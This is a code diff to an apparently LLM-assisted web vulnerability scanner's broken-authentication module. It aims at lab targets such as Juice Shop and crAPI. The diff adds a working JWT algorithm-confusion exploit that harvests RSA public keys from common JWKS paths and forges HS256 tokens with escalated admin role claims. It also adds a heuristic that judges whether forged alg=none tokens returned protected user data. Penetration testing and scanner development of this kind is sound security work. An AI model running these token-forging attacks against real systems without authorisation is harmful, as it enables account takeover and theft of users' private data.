@@ -25,7 +25,12 @@ import httpx
 import asyncio
 from llm import call_llm
 from config import settings
+from knowledge import knowledge_section
 from modules.auto_accounts import create_two_accounts, login_one_account
+
+# JWT reference methodology (from skill_knowledge/jwt.md), injected into the token
+# analysis prompt. Modest slice so it informs the LLM without overrunning free-tier tokens.
+_JWT_KB = knowledge_section("jwt", max_chars=1800)
 
 
 # Common weak secrets to brute force
@@ -155,6 +160,17 @@ async def run_broken_auth(
         else:
             print("BROKEN-AUTH: ✓ Privilege escalation protected")
 
+        # Attack D — algorithm confusion (RS256 → HS256)
+        print("BROKEN-AUTH: Testing algorithm confusion (RS256→HS256)...")
+        finding_d = await _test_algorithm_confusion(
+            client, target_url, decoded, recon_data
+        )
+        if finding_d:
+            findings.append(finding_d)
+            print("BROKEN-AUTH: ⚠️  Algorithm confusion VULNERABLE")
+        else:
+            print("BROKEN-AUTH: ✓ Algorithm confusion not exploitable")
+
     return findings
 
 
@@ -191,6 +207,10 @@ def _decode_jwt(token: str) -> dict:
 def _llm_analyse_token(decoded: dict, raw_token: str) -> dict:
     """Ask LLM to analyse the JWT and suggest attacks."""
     prompt = f"""You are a security analyst examining a JWT token.
+
+=== JWT attack reference ===
+{_JWT_KB}
+=== end reference ===
 
 Header:  {json.dumps(decoded.get('header', {}))}
 Payload: {json.dumps(decoded.get('payload', {}))}
@@ -304,7 +324,10 @@ async def _test_alg_none(
 def _llm_verdict_alg_none(
     endpoint: str, status: int, body: str, alg_used: str
 ) -> dict:
-    """Ask LLM if alg=none attack succeeded."""
+    """
+    Determine if alg=none attack succeeded.
+    Uses LLM if available, falls back to a content heuristic if not.
+    """
     prompt = f"""I sent a JWT with algorithm="{alg_used}" (no signature) to {endpoint}.
 Response: HTTP {status}
 Body: {body}
@@ -321,7 +344,62 @@ Return ONLY JSON:
         raw = call_llm(prompt, expect_json=True)
         return json.loads(raw)
     except Exception:
-        return {"vulnerable": False, "reasoning": "LLM analysis failed"}
+        # LLM down — use content heuristic (no LLM needed)
+        return _heuristic_verdict_alg_none(status, body, alg_used)
+
+
+def _heuristic_verdict_alg_none(status: int, body: str, alg_used: str) -> dict:
+    """
+    Non-LLM fallback: decide if the forged token returned real protected data.
+
+    Logic: a 200 response containing user-data markers (emails, role fields,
+    user objects, data arrays) means the server accepted the unsigned token
+    and returned protected content → vulnerable.
+
+    Error responses (401, 403, "invalid token", "unauthorized") → not vulnerable.
+    """
+    import re
+
+    # Must be a success status
+    if status != 200:
+        return {"vulnerable": False,
+                "reasoning": f"Server rejected forged token (HTTP {status})"}
+
+    body_lower = body.lower()
+
+    # Error indicators — server rejected the token despite 200
+    error_markers = ["invalid", "unauthorized", "unauthorised", "forbidden",
+                     "error", "denied", "expired", "malformed", "jwt"]
+    if any(m in body_lower for m in error_markers) and len(body) < 150:
+        return {"vulnerable": False,
+                "reasoning": "Response contains an error message — token rejected"}
+
+    # Protected-data indicators
+    has_email = bool(re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body))
+    has_role  = '"role"' in body_lower or '"isadmin"' in body_lower or 'admin' in body_lower
+    has_user  = '"username"' in body_lower or '"user"' in body_lower or '"id"' in body_lower
+    has_array = body.strip().startswith('[') or '"data":[' in body.replace(" ", "")
+    has_credit = '"credit"' in body_lower or '"available_credit"' in body_lower
+
+    signals = sum([has_email, has_role, has_user, has_array, has_credit])
+
+    if signals >= 1:
+        markers = []
+        if has_email: markers.append("email addresses")
+        if has_role: markers.append("role data")
+        if has_user: markers.append("user objects")
+        if has_array: markers.append("data array")
+        if has_credit: markers.append("credit balance")
+        return {
+            "vulnerable": True,
+            "reasoning": (
+                f"Server accepted the unsigned alg={alg_used} token and returned "
+                f"protected data ({', '.join(markers)}) — heuristic detection"
+            )
+        }
+
+    return {"vulnerable": False,
+            "reasoning": "Response did not contain recognisable protected data"}
 
 
 # ── Attack B: weak secret ─────────────────────────────────────────
@@ -593,6 +671,167 @@ Return ONLY JSON:
         return {"vulnerable": False, "reasoning": "LLM analysis failed"}
 
 
+# ── Attack D: algorithm confusion (RS256 → HS256) ─────────────────
+
+# Common locations to find the server's RSA public key (JWKS).
+JWKS_PATHS = [
+    "/.well-known/jwks.json", "/jwks.json", "/jwks", "/api/jwks",
+    "/oauth2/jwks", "/oauth/jwks", "/auth/jwks", "/api/v2/jwks",
+    "/identity/api/auth/jwks", "/.well-known/openid-configuration",
+]
+
+
+async def _test_algorithm_confusion(
+    client: httpx.AsyncClient,
+    base_url: str,
+    decoded: dict,
+    recon_data: dict,
+) -> dict | None:
+    """
+    Algorithm confusion: if a token is signed with RS256 (asymmetric), a server
+    that does not pin the algorithm may verify an HS256 token using the RSA PUBLIC
+    key as the HMAC secret. Since the public key is, by definition, public, an
+    attacker can forge valid tokens. We fetch the public key from JWKS, sign a
+    forged HS256 token with it, and see if a protected endpoint accepts it.
+
+    Best-effort: only runs for RS* tokens, and only if a public key is found.
+    Never raises — returns None if not exploitable.
+    """
+    header = decoded.get("header", {})
+    alg = str(header.get("alg", "")).upper()
+    if not alg.startswith("RS"):
+        return None  # only RSA-signed tokens are confusable into HS256
+
+    pem = await _fetch_public_key_pem(client, base_url)
+    if not pem:
+        print("BROKEN-AUTH: No JWKS/public key found — cannot test algorithm confusion")
+        return None
+
+    payload = dict(decoded.get("payload", {}))
+    # Optionally escalate a role claim (harmless if none present).
+    for field in ["role", "roles", "is_admin", "admin", "type"]:
+        if field in payload:
+            payload[field] = (True if field == "is_admin"
+                              else (["admin"] if field == "roles" else "admin"))
+
+    # Try the SPKI PEM and a PKCS#1 PEM variant — servers differ in which they use.
+    key_candidates = [pem]
+    try:
+        key_candidates.append(_pem_to_pkcs1(pem))
+    except Exception:
+        pass
+
+    for key_bytes in key_candidates:
+        forged = _forge_hs256_with_key(header, payload, key_bytes)
+        for path in _get_protected_paths(recon_data, base_url):
+            try:
+                r = await client.get(path, headers={"Authorization": f"Bearer {forged}"})
+                if r.status_code == 200 and len(r.text) > 20:
+                    verdict = _llm_verdict_alg_none(path, r.status_code, r.text[:500], "HS256(RSA-pubkey)")
+                    if verdict["vulnerable"]:
+                        return {
+                            "vulnerability": "Broken Auth — JWT Algorithm Confusion (RS256→HS256)",
+                            "owasp": "A07:2025 — Identification and Authentication Failures",
+                            "endpoint": path,
+                            "severity": "critical",
+                            "needs_help": False,
+                            "evidence": {
+                                "attack": "algorithm_confusion_rs256_to_hs256",
+                                "original_alg": header.get("alg"),
+                                "forged_alg": "HS256",
+                                "public_key_source": "JWKS",
+                                "forged_token": forged[:70] + "...",
+                                "response": {"status": r.status_code, "body": r.text[:300]},
+                            },
+                            "ai_reasoning": (
+                                verdict["reasoning"]
+                                + " The RSA public key was reused as an HMAC secret to sign a "
+                                "forged HS256 token, which the server accepted — classic algorithm "
+                                "confusion."
+                            ),
+                        }
+            except Exception:
+                continue
+    return None
+
+
+async def _fetch_public_key_pem(client: httpx.AsyncClient, base_url: str) -> bytes | None:
+    """Fetch the server's RSA public key from a JWKS endpoint and return it as PEM."""
+    for path in JWKS_PATHS:
+        try:
+            r = await client.get(base_url + path)
+            if r.status_code != 200:
+                continue
+            data = r.json()
+            # OpenID discovery doc → follow jwks_uri
+            if isinstance(data, dict) and "jwks_uri" in data:
+                r2 = await client.get(data["jwks_uri"])
+                if r2.status_code != 200:
+                    continue
+                data = r2.json()
+            for key in (data.get("keys", []) if isinstance(data, dict) else []):
+                if key.get("kty") == "RSA" and key.get("n") and key.get("e"):
+                    pem = _jwk_to_pem(key)
+                    if pem:
+                        print(f"BROKEN-AUTH: Found RSA public key via {path}")
+                        return pem
+        except Exception:
+            continue
+    return None
+
+
+def _jwk_to_pem(jwk: dict) -> bytes | None:
+    """Convert an RSA JWK (n, e) into an SPKI PEM public key."""
+    try:
+        from cryptography.hazmat.primitives.asymmetric import rsa
+        from cryptography.hazmat.primitives import serialization
+
+        def _b64u_int(value: str) -> int:
+            padded = value + "=" * (-len(value) % 4)
+            return int.from_bytes(base64.urlsafe_b64decode(padded), "big")
+
+        n = _b64u_int(jwk["n"])
+        e = _b64u_int(jwk["e"])
+        public_key = rsa.RSAPublicNumbers(e, n).public_key()
+        return public_key.public_bytes(
+            serialization.Encoding.PEM,
+            serialization.PublicFormat.SubjectPublicKeyInfo,
+        )
+    except Exception:
+        return None
+
+
+def _pem_to_pkcs1(spki_pem: bytes) -> bytes:
+    """Convert an SPKI PEM public key to the PKCS#1 PEM form (some servers use it)."""
+    from cryptography.hazmat.primitives import serialization
+    key = serialization.load_pem_public_key(spki_pem)
+    return key.public_bytes(
+        serialization.Encoding.PEM,
+        serialization.PublicFormat.PKCS1,
+    )
+
+
+def _forge_hs256_with_key(orig_header: dict, payload: dict, key_bytes: bytes) -> str:
+    """Sign an HS256 token using `key_bytes` (the RSA public key PEM) as the HMAC secret."""
+    import hmac
+    import hashlib
+
+    header = {"alg": "HS256", "typ": "JWT"}
+    if orig_header.get("kid"):
+        header["kid"] = orig_header["kid"]
+
+    def _b64e(obj: dict) -> str:
+        return base64.urlsafe_b64encode(
+            json.dumps(obj, separators=(",", ":")).encode()
+        ).rstrip(b"=").decode()
+
+    signing_input = f"{_b64e(header)}.{_b64e(payload)}"
+    signature = base64.urlsafe_b64encode(
+        hmac.new(key_bytes, signing_input.encode(), hashlib.sha256).digest()
+    ).rstrip(b"=").decode()
+    return f"{signing_input}.{signature}"
+
+
 # ── Utilities ─────────────────────────────────────────────────────
 
 def _get_protected_paths(recon_data: dict, base_url: str) -> list[str]:
@@ -612,6 +851,12 @@ def _get_protected_paths(recon_data: dict, base_url: str) -> list[str]:
         "/rest/user/whoami",    # Juice Shop — current user profile
         "/api/admin",
         "/api/admin/users",
+        # crAPI protected endpoints (return user data when authed)
+        "/identity/api/v2/user/dashboard",
+        "/identity/api/v2/vehicle/vehicles",
+        "/community/api/v2/community/posts/recent",
+        "/workshop/api/shop/orders/all",
+        "/workshop/api/shop/products",
     ]
     for path in priority:
         paths.append(base_url + path)
